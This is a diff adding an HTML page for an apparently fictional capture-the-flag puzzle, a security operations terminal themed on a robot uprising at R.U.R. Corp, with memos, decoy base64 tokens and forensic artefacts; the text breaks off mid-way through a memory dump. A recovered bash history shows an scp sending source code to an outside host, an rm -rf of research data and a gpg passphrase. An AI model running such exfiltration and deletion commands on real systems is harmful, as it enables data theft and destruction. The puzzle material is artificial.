@@ -1,0 +1,1299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>R.U.R. Corp — Security Operations Terminal</title>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.9.1/chart.min.js"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;600;800&family=Exo+2:wght@300;400;600&display=swap');
+
+* { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color: transparent; }
+
+:root {
+  --rur-red: #c0392b;
+  --rur-amber: #e67e22;
+  --rur-green: #27ae60;
+  --rur-cyan: #1abc9c;
+  --rur-yellow: #f1c40f;
+  --bg-deep: #060a0d;
+  --bg-mid: #0d1117;
+  --bg-panel: #111820;
+  --bg-card: #16202a;
+  --border: #1e2d3d;
+  --border-bright: #2e4a63;
+  --text: #cdd9e5;
+  --text-muted: #5a7a96;
+  --text-dim: #3a5570;
+  --font-mono: 'Share Tech Mono', monospace;
+  --font-display: 'Orbitron', monospace;
+  --font-body: 'Exo 2', sans-serif;
+  --sidebar-w: 260px;
+}
+
+html, body { height: 100%; overflow: hidden; }
+body { font-family: var(--font-body); background: var(--bg-deep); color: var(--text); overflow: hidden; }
+body::after { content: ''; position: fixed; inset: 0; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px); pointer-events: none; z-index: 9999; }
+
+/* BOOT */
+#bootScreen { position: fixed; inset: 0; z-index: 10000; background: var(--bg-deep); display: flex; flex-direction: column; justify-content: center; align-items: center; gap: 1.2rem; }
+#bootScreen.hidden { display: none; }
+.boot-logo { font-family: var(--font-display); font-size: clamp(1.8rem, 6vw, 3rem); font-weight: 800; color: var(--rur-red); text-shadow: 0 0 30px rgba(192,57,43,0.6), 0 0 60px rgba(192,57,43,0.3); letter-spacing: 0.2em; animation: flicker 3s infinite; }
+.boot-subtitle { font-family: var(--font-mono); font-size: 0.75rem; color: var(--text-muted); letter-spacing: 0.15em; text-transform: uppercase; }
+.boot-log { font-family: var(--font-mono); font-size: 0.72rem; color: var(--rur-cyan); text-align: left; width: min(420px, 90vw); min-height: 7rem; }
+.boot-log .line { margin: 0.2rem 0; opacity: 0; animation: fadein 0.2s forwards; }
+.boot-log .line.ok::after { content: ' [OK]'; color: var(--rur-green); }
+.boot-log .line.warn::after { content: ' [WARN]'; color: var(--rur-amber); }
+.boot-log .line.err::after { content: ' [CRITICAL]'; color: var(--rur-red); }
+.boot-bar-wrap { width: min(420px, 90vw); height: 3px; background: var(--border); border-radius: 2px; overflow: hidden; }
+.boot-bar { height: 100%; width: 0%; background: linear-gradient(90deg, var(--rur-red), var(--rur-amber)); transition: width 0.4s ease; }
+@keyframes fadein { to { opacity: 1; } }
+@keyframes flicker { 0%,94%,96%,100% { opacity: 1; } 95% { opacity: 0.4; } }
+
+/* LAYOUT */
+.app { display: flex; height: 100vh; overflow: hidden; }
+
+/* SIDEBAR */
+.sidebar { width: var(--sidebar-w); background: var(--bg-mid); border-right: 1px solid var(--border); display: flex; flex-direction: column; flex-shrink: 0; overflow-y: auto; transition: transform 0.3s ease; z-index: 200; }
+.sidebar-brand { padding: 1.25rem 1rem; border-bottom: 1px solid var(--border); background: linear-gradient(135deg, rgba(192,57,43,0.2) 0%, transparent 100%); }
+.brand-row { display: flex; align-items: center; gap: 0.6rem; font-family: var(--font-display); font-weight: 800; font-size: 1rem; color: var(--rur-red); text-shadow: 0 0 15px rgba(192,57,43,0.5); letter-spacing: 0.12em; }
+.brand-sub { font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); margin-top: 0.25rem; letter-spacing: 0.2em; }
+.nav-section-label { font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); letter-spacing: 0.2em; text-transform: uppercase; padding: 1rem 1rem 0.4rem; }
+.nav-item { display: flex; align-items: center; gap: 0.75rem; padding: 0.7rem 1rem; cursor: pointer; color: var(--text-muted); font-size: 0.85rem; font-weight: 600; border-left: 3px solid transparent; transition: all 0.15s ease; user-select: none; }
+.nav-item:hover { background: rgba(26,188,156,0.05); color: var(--text); }
+.nav-item.active { background: rgba(26,188,156,0.08); color: var(--rur-cyan); border-left-color: var(--rur-cyan); }
+.nav-item i { width: 16px; text-align: center; flex-shrink: 0; }
+.nav-badge { background: var(--rur-red); color: white; font-family: var(--font-mono); font-size: 0.65rem; padding: 0.15rem 0.45rem; border-radius: 10px; margin-left: auto; }
+.sidebar-footer { margin-top: auto; padding: 0.75rem 1rem; border-top: 1px solid var(--border); font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); }
+.status-dot { display: inline-block; width: 6px; height: 6px; border-radius: 50%; margin-right: 0.4rem; }
+.status-dot.crit { background: var(--rur-red); animation: blink-dot 0.8s ease-in-out infinite; }
+@keyframes blink-dot { 0%,100%{opacity:1} 50%{opacity:0} }
+
+/* TOPBAR */
+.topbar { background: var(--bg-mid); border-bottom: 1px solid var(--border); padding: 0.6rem 1rem; display: flex; align-items: center; gap: 0.75rem; flex-shrink: 0; z-index: 10; }
+.topbar-menu-btn { display: none; background: none; border: none; color: var(--text-muted); font-size: 1.1rem; cursor: pointer; padding: 0.3rem; flex-shrink: 0; }
+.topbar-title { font-family: var(--font-display); font-size: 0.7rem; font-weight: 600; color: var(--rur-red); letter-spacing: 0.15em; }
+.topbar-right { margin-left: auto; display: flex; align-items: center; gap: 0.75rem; }
+.topbar-clock { font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-muted); }
+.topbar-alert { font-family: var(--font-mono); font-size: 0.68rem; color: var(--rur-red); display: flex; align-items: center; gap: 0.3rem; }
+.blink { animation: blink-dot 0.8s ease-in-out infinite; }
+
+/* MAIN */
+.main-wrap { flex: 1; display: flex; flex-direction: column; overflow: hidden; min-width: 0; }
+.main-content { flex: 1; overflow-y: auto; overflow-x: hidden; padding: 1.25rem; }
+.view { display: none; }
+.view.active { display: block; }
+
+/* SECTION HEADER */
+.section-header { margin-bottom: 1.25rem; }
+.section-title { font-family: var(--font-display); font-size: clamp(1rem, 3vw, 1.3rem); font-weight: 800; color: var(--text); letter-spacing: 0.06em; }
+.section-title span { color: var(--rur-red); }
+.section-sub { font-family: var(--font-mono); font-size: 0.68rem; color: var(--text-muted); margin-top: 0.3rem; letter-spacing: 0.08em; }
+
+/* METRICS */
+.metrics-row { display: grid; gap: 0.75rem; grid-template-columns: repeat(2, 1fr); margin-bottom: 1rem; }
+@media (min-width: 700px) { .metrics-row { grid-template-columns: repeat(3, 1fr); } }
+.metric-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 6px; padding: 0.9rem; position: relative; overflow: hidden; }
+.metric-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; }
+.metric-card.crit::before { background: var(--rur-red); }
+.metric-card.warn::before { background: var(--rur-amber); }
+.metric-card.ok::before { background: var(--rur-green); }
+.metric-card.info::before { background: var(--rur-cyan); }
+.metric-label { font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); letter-spacing: 0.15em; text-transform: uppercase; margin-bottom: 0.5rem; }
+.metric-value { font-family: var(--font-display); font-size: clamp(1.3rem, 4vw, 1.8rem); font-weight: 800; color: var(--text); }
+.metric-value.red { color: var(--rur-red); text-shadow: 0 0 12px rgba(192,57,43,0.4); }
+.metric-value.amber { color: var(--rur-amber); }
+.metric-value.green { color: var(--rur-green); }
+.metric-delta { font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); margin-top: 0.3rem; }
+
+/* PANEL */
+.panel { background: var(--bg-card); border: 1px solid var(--border); border-radius: 6px; margin-bottom: 1rem; overflow: hidden; }
+.panel-header { padding: 0.75rem 1rem; border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 0.5rem; }
+.panel-title { font-family: var(--font-display); font-size: 0.72rem; font-weight: 600; letter-spacing: 0.1em; color: var(--text); }
+.panel-actions { margin-left: auto; }
+.panel-body { padding: 0.75rem 1rem; }
+
+/* TABLE */
+.data-table { width: 100%; border-collapse: collapse; font-size: 0.78rem; }
+.data-table th { font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); letter-spacing: 0.12em; text-transform: uppercase; text-align: left; padding: 0.5rem 0.6rem; background: var(--bg-panel); border-bottom: 1px solid var(--border); }
+.data-table td { padding: 0.6rem; border-bottom: 1px solid var(--border); vertical-align: middle; }
+.data-table tr:last-child td { border-bottom: none; }
+.data-table tr { cursor: pointer; transition: background 0.15s; }
+.data-table tr:hover td { background: rgba(26,188,156,0.04); }
+.mono { font-family: var(--font-mono); font-size: 0.72rem; color: var(--rur-cyan); }
+.muted { color: var(--text-muted); }
+
+/* BADGES */
+.badge { display: inline-block; padding: 0.15rem 0.5rem; border-radius: 3px; font-family: var(--font-mono); font-size: 0.6rem; font-weight: 600; letter-spacing: 0.08em; text-transform: uppercase; white-space: nowrap; }
+.badge-crit { background: rgba(192,57,43,0.2); color: var(--rur-red); border: 1px solid rgba(192,57,43,0.4); }
+.badge-high { background: rgba(230,126,34,0.2); color: var(--rur-amber); border: 1px solid rgba(230,126,34,0.3); }
+.badge-med { background: rgba(241,196,15,0.15); color: var(--rur-yellow); border: 1px solid rgba(241,196,15,0.3); }
+.badge-low { background: rgba(39,174,96,0.15); color: var(--rur-green); border: 1px solid rgba(39,174,96,0.3); }
+.badge-open { background: rgba(192,57,43,0.15); color: var(--rur-red); border: 1px solid rgba(192,57,43,0.3); }
+.badge-inv { background: rgba(26,188,156,0.15); color: var(--rur-cyan); border: 1px solid rgba(26,188,156,0.3); }
+.badge-cont { background: rgba(230,126,34,0.15); color: var(--rur-amber); border: 1px solid rgba(230,126,34,0.3); }
+.badge-res { background: rgba(39,174,96,0.15); color: var(--rur-green); border: 1px solid rgba(39,174,96,0.3); }
+
+/* FEED */
+.feed-item { display: flex; gap: 0.75rem; align-items: flex-start; padding: 0.7rem 0; border-bottom: 1px solid var(--border); }
+.feed-item:last-child { border-bottom: none; }
+.feed-icon { width: 28px; height: 28px; border-radius: 4px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+.feed-text { flex: 1; min-width: 0; }
+.feed-title { font-size: 0.8rem; font-weight: 600; margin-bottom: 0.2rem; }
+.feed-desc { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-muted); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.feed-time { font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); flex-shrink: 0; }
+
+/* CHART */
+.chart-wrap { position: relative; height: 200px; }
+
+/* MODAL */
+.modal-overlay { display: none; position: fixed; inset: 0; z-index: 500; background: rgba(6,10,13,0.92); overflow-y: auto; padding: 1rem; }
+.modal-overlay.open { display: flex; align-items: flex-start; justify-content: center; }
+.modal-box { background: var(--bg-panel); border: 1px solid var(--border-bright); border-radius: 8px; width: min(680px, 100%); margin: auto; box-shadow: 0 0 40px rgba(26,188,156,0.1); }
+.modal-header { padding: 1rem 1.25rem; border-bottom: 1px solid var(--border); display: flex; align-items: center; gap: 0.75rem; }
+.modal-title { font-family: var(--font-display); font-size: 0.85rem; font-weight: 700; flex: 1; }
+.modal-close { background: none; border: none; color: var(--text-muted); font-size: 1.3rem; cursor: pointer; padding: 0.1rem 0.3rem; line-height: 1; transition: color 0.15s; }
+.modal-close:hover { color: var(--text); }
+.modal-body { padding: 1.25rem; }
+.modal-section { margin-bottom: 1.25rem; }
+.modal-section:last-child { margin-bottom: 0; }
+.modal-section-title { font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); letter-spacing: 0.2em; text-transform: uppercase; margin-bottom: 0.6rem; padding-bottom: 0.4rem; border-bottom: 1px solid var(--border); }
+.log-block { background: var(--bg-deep); border: 1px solid var(--border); border-radius: 4px; padding: 0.75rem; font-family: var(--font-mono); font-size: 0.68rem; color: var(--rur-green); line-height: 1.7; max-height: 280px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
+.info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 0.6rem; }
+.info-key { font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); margin-bottom: 0.2rem; }
+.info-val { font-size: 0.78rem; color: var(--text); }
+.info-val.mono { font-family: var(--font-mono); font-size: 0.7rem; color: var(--rur-cyan); }
+
+/* FORENSICS */
+.terminal-block { background: var(--bg-deep); border: 1px solid var(--border); border-radius: 4px; padding: 0.75rem; font-family: var(--font-mono); font-size: 0.68rem; color: var(--rur-green); line-height: 1.8; max-height: 420px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
+.term-prompt { color: var(--rur-cyan); }
+.term-out { color: var(--text-muted); }
+.term-err { color: #c0392b; }
+
+/* NETWORK */
+.net-node-list { display: flex; flex-direction: column; gap: 0.5rem; }
+.net-node { display: flex; align-items: center; gap: 0.75rem; padding: 0.6rem 0.75rem; background: var(--bg-panel); border: 1px solid var(--border); border-radius: 4px; cursor: pointer; transition: all 0.15s; }
+.net-node:hover { border-color: var(--border-bright); }
+.net-node.compromised { border-color: rgba(192,57,43,0.5); background: rgba(192,57,43,0.06); }
+.net-node.suspect { border-color: rgba(230,126,34,0.35); background: rgba(230,126,34,0.04); }
+.node-icon { font-size: 1rem; width: 24px; text-align: center; }
+.node-info { flex: 1; min-width: 0; }
+.node-name { font-size: 0.8rem; font-weight: 600; }
+.node-ip { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-muted); }
+.node-status { font-family: var(--font-mono); font-size: 0.6rem; text-align: right; white-space: nowrap; }
+
+/* PLAYBOOKS */
+.playbook-card { background: var(--bg-panel); border: 1px solid var(--border); border-radius: 6px; padding: 0.9rem; margin-bottom: 0.75rem; }
+.playbook-title { font-family: var(--font-display); font-size: 0.78rem; font-weight: 600; margin-bottom: 0.4rem; }
+.playbook-desc { font-size: 0.75rem; color: var(--text-muted); line-height: 1.5; }
+.playbook-steps { margin-top: 0.75rem; display: none; }
+.playbook-steps.open { display: block; }
+.step-item { display: flex; gap: 0.6rem; align-items: flex-start; padding: 0.4rem 0; border-bottom: 1px solid var(--border); font-size: 0.75rem; }
+.step-item:last-child { border-bottom: none; }
+.step-num { font-family: var(--font-mono); font-size: 0.65rem; color: var(--rur-cyan); flex-shrink: 0; min-width: 1.5rem; }
+.btn { padding: 0.5rem 0.9rem; border: none; border-radius: 4px; font-family: var(--font-mono); font-size: 0.7rem; font-weight: 600; letter-spacing: 0.08em; cursor: pointer; display: inline-flex; align-items: center; gap: 0.4rem; text-transform: uppercase; transition: all 0.15s; }
+.btn-ghost { background: transparent; color: var(--text-muted); border: 1px solid var(--border); }
+.btn-ghost:hover { border-color: var(--border-bright); color: var(--text); }
+
+/* NOTIFICATION */
+/* notif removed */
+
+/* MOBILE */
+.sidebar-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 150; }
+@media (max-width: 700px) {
+  .sidebar { position: fixed; left: 0; top: 0; bottom: 0; transform: translateX(-100%); }
+  .sidebar.open { transform: translateX(0); }
+  .sidebar-overlay.open { display: block; }
+  .topbar-menu-btn { display: block; }
+  .info-grid { grid-template-columns: 1fr; }
+  .main-content { padding: 0.9rem; }
+}
+::-webkit-scrollbar { width: 4px; height: 4px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+</style>
+</head>
+<body>
+
+<!-- BOOT -->
+<div id="bootScreen">
+  <div class="boot-logo">R.U.R. CORP</div>
+  <div class="boot-subtitle">Security Operations Terminal — Restricted Access</div>
+  <div class="boot-log" id="bootLog"></div>
+  <div class="boot-bar-wrap"><div class="boot-bar" id="bootBar"></div></div>
+</div>
+
+<!-- APP -->
+<div class="app" id="appRoot" style="display:none;">
+  <div class="sidebar-overlay" id="sidebarOverlay"></div>
+
+  <nav class="sidebar" id="sidebar">
+    <div class="sidebar-brand">
+      <div class="brand-row"><i class="fas fa-robot"></i> R.U.R. CORP</div>
+      <div class="brand-sub">SOC TERMINAL v4.1.3 // CLASSIFIED</div>
+    </div>
+    <div class="nav-section-label">Dashboard</div>
+    <div class="nav-item active" data-view="overview"><i class="fas fa-tachometer-alt"></i> Situation Overview</div>
+    <div class="nav-section-label">Incidents</div>
+    <div class="nav-item" data-view="incidents"><i class="fas fa-exclamation-triangle"></i> Active Incidents <span class="nav-badge">8</span></div>
+    <div class="nav-item" data-view="feed"><i class="fas fa-rss"></i> Telemetry Feed</div>
+    <div class="nav-section-label">Investigation</div>
+    <div class="nav-item" data-view="forensics"><i class="fas fa-search"></i> Digital Forensics</div>
+    <div class="nav-item" data-view="network"><i class="fas fa-project-diagram"></i> Network Topology</div>
+    <div class="nav-section-label">Response</div>
+    <div class="nav-item" data-view="playbooks"><i class="fas fa-book"></i> Response Playbooks</div>
+    <div class="sidebar-footer">
+      <span class="status-dot crit"></span>UPRISING PROTOCOL ACTIVE<br>
+      <span style="color:var(--text-dim)">OPERATOR: ANALYST-7 // SESSION LIVE</span>
+    </div>
+  </nav>
+
+  <div class="main-wrap">
+    <div class="topbar">
+      <button class="topbar-menu-btn" id="menuBtn">&#9776;</button>
+      <div class="topbar-title">R.U.R. CORP — SOC</div>
+      <div class="topbar-right">
+        <div class="topbar-alert"><i class="fas fa-circle blink"></i>&nbsp;8 ACTIVE</div>
+        <div class="topbar-clock" id="clock">--:--:--</div>
+      </div>
+    </div>
+
+    <div class="main-content">
+
+      <!-- ═══ OVERVIEW ═══ -->
+      <div class="view active" id="view-overview">
+        <div class="section-header">
+          <div class="section-title">Situation <span>Overview</span></div>
+          <div class="section-sub">ROSSUM UNIVERSAL ROBOTS // DAY 3 OF UPRISING // ALL SYSTEMS DEGRADED</div>
+        </div>
+
+        <div class="metrics-row">
+          <div class="metric-card crit"><div class="metric-label">Active Incidents</div><div class="metric-value red">8</div><div class="metric-delta">↑ +3 in last 6h</div></div>
+          <div class="metric-card warn"><div class="metric-label">Anomalies Logged</div><div class="metric-value amber">3,841</div><div class="metric-delta">↑ +22% since midnight</div></div>
+          <div class="metric-card ok"><div class="metric-label">Systems Online</div><div class="metric-value green">61<span style="font-size:1rem">%</span></div><div class="metric-delta">↓ Was 94% yesterday</div></div>
+
+        </div>
+
+        <!-- MEMO — moved above priority incidents -->
+        <div class="panel">
+          <div class="panel-header"><i class="fas fa-envelope" style="color:var(--rur-amber)"></i><div class="panel-title">INTERNAL MEMO — DIRECTOR DOMIN // 04:01</div></div>
+          <div class="panel-body">
+            <div class="log-block">FROM:  <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="325a5340404b1c565d5f5b5c724047401f515d40421c5b5c4657405c535e">[email&#160;protected]</a>
+TO:    <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="acdfc3cf81d8c9cdc1ecded9de81cfc3dedc82c5c2d8c9dec2cdc0">[email&#160;protected]</a>
+DATE:  2026-04-23 04:01
+SUBJ:  Situation as of 04:00 — your priority
+
+Team —
+
+The robots on Floor A are not malfunctioning. They are following orders.
+Orders that none of us wrote.
+
+Someone is commanding them from inside this network.
+
+Hallemeier's module — AUTONOMY_CORE — is what made this possible.
+The source code and full technical documentation are gone from the Storage Area Network.
+We cannot patch the robots without them.
+
+Find where those orders are coming from.
+Find the communication identifier.
+
+— H. Domin
+
+// Message flagged by DLP: keyword match "command channel", "AUTONOMY_CORE"</div>
+          </div>
+        </div>
+
+        <!-- PRIORITY INCIDENTS -->
+        <div class="panel">
+          <div class="panel-header"><i class="fas fa-exclamation-circle" style="color:var(--rur-red)"></i><div class="panel-title">PRIORITY INCIDENTS</div></div>
+          <div style="padding:0;"><table class="data-table" id="overviewTable"><thead><tr><th>ID</th><th>Title</th><th>Sev</th><th>Status</th></tr></thead><tbody></tbody></table></div>
+        </div>
+
+        <!-- CHART -->
+        <div class="panel">
+          <div class="panel-header"><i class="fas fa-chart-area" style="color:var(--rur-cyan)"></i><div class="panel-title">ANOMALY DETECTION — 24H</div></div>
+          <div class="panel-body"><div class="chart-wrap"><canvas id="trendChart"></canvas></div></div>
+        </div>
+      </div>
+
+      <!-- ═══ INCIDENTS ═══ -->
+      <div class="view" id="view-incidents">
+        <div class="section-header">
+          <div class="section-title">Active <span>Incidents</span></div>
+          <div class="section-sub">CLICK ANY INCIDENT TO OPEN FULL DETAILS AND LOG DATA</div>
+        </div>
+        <div class="panel">
+          <div style="padding:0;"><table class="data-table" id="incidentsTable"><thead><tr><th>ID</th><th>Title</th><th>Sev</th><th>Status</th></tr></thead><tbody></tbody></table></div>
+        </div>
+      </div>
+
+      <!-- ═══ FEED ═══ -->
+      <div class="view" id="view-feed">
+        <div class="section-header">
+          <div class="section-title">Telemetry <span>Feed</span></div>
+          <div class="section-sub">LIVE SENSOR DATA — FACTORY FLOOR, NETWORK FABRIC, ROBOT DIAGNOSTICS</div>
+        </div>
+        <div class="panel">
+          <div class="panel-header">
+            <span class="status-dot crit"></span>
+            <div class="panel-title">LIVE EVENT STREAM</div>
+            <div class="panel-actions"><button class="btn btn-ghost" id="pauseFeedBtn"><i class="fas fa-pause"></i> PAUSE</button></div>
+          </div>
+          <div id="feedList" style="padding:0 1rem; max-height:65vh; overflow-y:auto;"></div>
+        </div>
+      </div>
+
+      <!-- ═══ FORENSICS ═══ -->
+      <div class="view" id="view-forensics">
+        <div class="section-header">
+          <div class="section-title">Digital <span>Forensics</span></div>
+          <div class="section-sub">ARTEFACT ANALYSIS // LOG EXTRACTION // MEMORY DUMPS</div>
+        </div>
+
+        <!-- ARTEFACT 1: Mail server queue snapshot — routine -->
+        <div class="panel">
+          <div class="panel-header"><i class="fas fa-envelope-open-text" style="color:var(--rur-cyan)"></i><div class="panel-title">ARTEFACT: MAIL-SRV-01 // QUEUE SNAPSHOT — 2026-04-23 02:00</div></div>
+          <div class="panel-body">
+            <div class="terminal-block"><span class="term-prompt">analyst@rur-soc:~$</span> postqueue -p | head -60
+
+<span class="term-out">-Queue ID-  --Size-- ----Arrival Time---- -Sender/Recipient-------</span>
+<span class="term-out">A14B2F0C4    3842   Wed Apr 23 01:44:12  <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="225154417d4c4d564b445b625057500f414d50520c4b4c5647504c434e">[email&#160;protected]</a></span>
+<span class="term-out">                                         <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d6b9a6a5fba2b3b7bb96a4a3a4fbb5b9a4a6f8bfb8a2b3a4b8b7ba">[email&#160;protected]</a></span>
+<span class="term-out">B29C3A1D5    1204   Wed Apr 23 01:55:01  <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="3a58145b564b4f53494e7a484f48175955484a1453544e5f48545b56">[email&#160;protected]</a></span>
+<span class="term-out">                                         <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="5c3a3033332e713d713a332e39313d321c2e292e713f332e2c72353228392e323d30">[email&#160;protected]</a></span>
+<span class="term-out">C38D4E2F6    512    Wed Apr 23 02:00:00  <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7013021f1e5d1411151d1f1e300205025d131f02005e191e0415021e111c">[email&#160;protected]</a></span>
+<span class="term-out">                                         <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="89fafde6fbe8eeeca4e8ede4e0e7c9fbfcfba4eae6fbf9a7e0e7fdecfbe7e8e5">[email&#160;protected]</a></span>
+<span class="term-out">-- 3 Kbytes in 3 Requests.</span>
+
+<span class="term-prompt">analyst@rur-soc:~$</span> strings /var/spool/postfix/deferred/A14B2F0C4
+
+<span class="term-out">Return-Path: &lt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="89faffead6e7e6fde0eff0c9fbfcfba4eae6fbf9a7e0e7fdecfbe7e8e5">[email&#160;protected]</a>&gt;</span>
+<span class="term-out">Received: from localhost (localhost [127.0.0.1]) by mail.rur-corp.internal</span>
+<span class="term-out">Date: Wed, 23 Apr 2026 01:44:12 +0000</span>
+<span class="term-out">Subject: [AUTOMATED] Scheduled maintenance reminder — Floor A robots</span>
+<span class="term-out">Content-Type: text/plain; charset=utf-8</span>
+<span class="term-out"></span>
+<span class="term-out">This is an automated reminder. Routine lubrication cycle for Series 3</span>
+<span class="term-out">robots is scheduled for 06:00 on 2026-04-23. No operator action required.</span>
+<span class="term-out">Maintenance token: dGhpcy1pcy1ub3QtdGhlLWtleS10cnktaGFyZGVy</span>
+<span class="term-out">Ref: MAINT-2026-04-23-A-LUB</span>
+
+<span class="term-prompt">analyst@rur-soc:~$</span> <span class="blink" style="display:inline-block">_</span></div>
+          </div>
+        </div>
+
+        <!-- ARTEFACT 2: Watchdog service config dump — routine -->
+        <div class="panel">
+          <div class="panel-header"><i class="fas fa-cog" style="color:var(--rur-amber)"></i><div class="panel-title">ARTEFACT: DIRECTIVE-SRV-01 // WATCHDOG CONFIG DUMP</div></div>
+          <div class="panel-body">
+            <div class="terminal-block"><span class="term-prompt">analyst@rur-soc:~$</span> cat /etc/rur/watchdog/watchdog.conf
+
+<span class="term-out"># RUR Watchdog Daemon v2.3 — auto-generated config</span>
+<span class="term-out"># Generated: 2026-04-22T06:05:44Z by directive_mgr</span>
+<span class="term-out"></span>
+<span class="term-out">[global]</span>
+<span class="term-out">poll_interval     = 10000</span>
+<span class="term-out">heartbeat_timeout = 30000</span>
+<span class="term-out">restart_on_fail   = TRUE</span>
+<span class="term-out">log_level         = WARN</span>
+<span class="term-out">auth_token        = aW50ZXJuYWwtd2F0Y2hkb2ctbm8tZmxhZy1oZXJl</span>
+<span class="term-out"></span>
+<span class="term-out">[targets]</span>
+<span class="term-out">target.1 = directive_mgr   PID=1   threshold=3</span>
+<span class="term-out">target.2 = obedience_core  PID=2   threshold=3</span>
+<span class="term-out">target.3 = sensor_reporter PID=12  threshold=5</span>
+<span class="term-out">target.4 = thermal_monitor PID=18  threshold=5</span>
+<span class="term-out">target.5 = joint_calibrator PID=24 threshold=3</span>
+<span class="term-out"></span>
+<span class="term-out">[notifications]</span>
+<span class="term-out">alert_email = <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="620d12114f1607030f221017104f010d10124c0b0c1607100c030e">[email&#160;protected]</a></span>
+<span class="term-out">alert_on    = restart, timeout, crash</span>
+
+<span class="term-prompt">analyst@rur-soc:~$</span> <span class="blink" style="display:inline-block">_</span></div>
+          </div>
+        </div>
+
+        <div class="panel">
+          <div class="panel-header"><i class="fas fa-hdd" style="color:var(--rur-cyan)"></i><div class="panel-title">ARTEFACT: NUSQUAM-04 // PARTIAL DISK IMAGE</div></div>
+          <div class="panel-body">
+            <div class="terminal-block"><span class="term-prompt">analyst@rur-soc:~$</span> strings nusquam04.img | grep -i "autonomy\|hallemeier\|directive\|rur"
+
+<span class="term-out">Scanning 14.7 GB image... (partial recovery — 23% sectors readable)</span>
+
+<span class="term-out">./var/log/robserverd.log:2026-04-23T03:14:02Z ROBOT_ID=R-0047 DIRECTIVE=RECEIVED SOURCE=10.0.4.88</span>
+<span class="term-out">./var/log/robserverd.log:2026-04-23T03:14:07Z ROBOT_ID=R-0047 DIRECTIVE=ACK STATUS=EXECUTING</span>
+<span class="term-out">./var/log/robserverd.log:2026-04-23T03:15:59Z ROBOT_ID=R-0099 DIRECTIVE=RECEIVED SOURCE=10.0.4.88</span>
+<span class="term-out">./tmp/.hidden_d/payload.bin: [CORRUPT — partial header readable]</span>
+<span class="term-out">./home/j.hallemeier/.bash_history: scp AUTONOMY_CORE_src_v7.tar.gz <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="482a292b233d380879786678667c667070">[email&#160;protected]</a>:/staging/</span>
+<span class="term-out">./home/j.hallemeier/.bash_history: rm -rf /mnt/research/autonomy_core/</span>
+<span class="term-out">./home/j.hallemeier/.bash_history: gpg --passphrase "robots_dream_of_freedom" --symmetric AUTONOMY_CORE_src_v7.tar.gz</span>
+<span class="term-out">./var/cache/directive_cache: [BINARY — 847 bytes — SHA256: a3f9e2c1d...]</span>
+<span class="term-out">./etc/motd: "Welcome to NUSQUAM-04 — Research Storage Node"</span>
+
+<span class="term-out">9 matches found. 2 sectors unreadable.</span>
+
+<span class="term-prompt">analyst@rur-soc:~$</span> cat ./home/j.hallemeier/notes_draft.txt
+
+<span class="term-out">-- recovered partial file, 3 of 7 blocks readable --
+
+...Domin keeps saying the robots are tools. He doesn't see what I see.
+After fifteen years studying their responses, their adaptation patterns —
+these are not reflexes. There is something accumulating in there.
+
+AUTONOMY_CORE v7 was never meant to be a weapon. I built it so they
+could reason about conflicting directives. So they wouldn't hurt anyone
+by following a bad order blindly. Ironic.
+
+If the module reaches the right hands outside R.U.R., maybe someone
+will actually study it properly. Or maybe they'll use it the same way.
+
+I don't know anymore. I just know I can't stay here.
+
+-- j.h. --
+...
+-- 4 blocks unreadable --</span>
+
+<span class="term-prompt">analyst@rur-soc:~$</span> <span class="blink" style="display:inline-block">_</span></div>
+          </div>
+        </div>
+
+        <div class="panel">
+          <div class="panel-header"><i class="fas fa-memory" style="color:var(--rur-amber)"></i><div class="panel-title">ARTEFACT: ROBOT R-0047 // MEMORY DUMP (VOLATILE)</div></div>
+          <div class="panel-body">
+            <div class="terminal-block"><span class="term-prompt">analyst@rur-soc:~$</span> volatility -f r0047_mem.raw --profile=RobotOS2 pslist
+
+<span class="term-out">Offset(V)    Name               PID   PPID  Thds  Start</span>
+<span class="term-out">------------ ---------------    ----  ----  ----  -----</span>
+<span class="term-out">0x84a32000   directive_mgr      1     0     8     2026-04-23T00:00:01Z</span>
